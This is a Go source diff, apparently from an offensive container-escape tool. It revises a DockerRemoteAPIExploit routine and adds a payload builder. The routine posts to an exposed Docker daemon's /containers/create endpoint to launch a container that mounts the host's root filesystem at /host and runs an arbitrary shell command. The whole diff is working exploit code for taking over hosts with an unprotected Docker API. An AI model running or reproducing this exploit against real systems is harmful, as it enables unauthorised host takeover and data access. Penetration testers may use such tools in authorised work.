@@ -53,9 +53,17 @@ var dockerAPIHttpPostData = `
 	"HostConfig": {
 		"Binds": ["/:/host"]
 	},
-	"CMD": ["/bin/sh","-c","<SHELL_CMD>"]
+	"CMD": ["<SHELL_PATH>","-c","<SHELL_CMD>"]
 }
 `
+
+func dockerAPIHttpPostPayload(cmd string) string {
+	cmd = strings.Replace(cmd, "\"", "\\\"", -1)
+	cmd = strings.Replace(cmd, "\n", "\\n", -1)
+	cmd = strings.Replace(cmd, "\t", "\\t", -1)
+	payloadData := strings.Replace(dockerAPIHttpPostData, "<SHELL_PATH>", util.ShellPath(), -1)
+	return strings.Replace(payloadData, "<SHELL_CMD>", cmd, -1)
+}
 
 func CheckDockerRemoteAPI(url string) bool {
 	url = url + "/info"
@@ -87,7 +95,7 @@ func DockerRemoteAPIExploit(api string, cmd string) {
 
 	// create container with user cmd
 	url = api + "/containers/create"
-	payloadData := strings.Replace(dockerAPIHttpPostData, "<SHELL_CMD>", cmd, -1)
+	payloadData := dockerAPIHttpPostPayload(cmd)
 	ans, err = util.HttpSendJson("POST", url, payloadData)
 	if err != nil {
 		log.Fatalln(err)
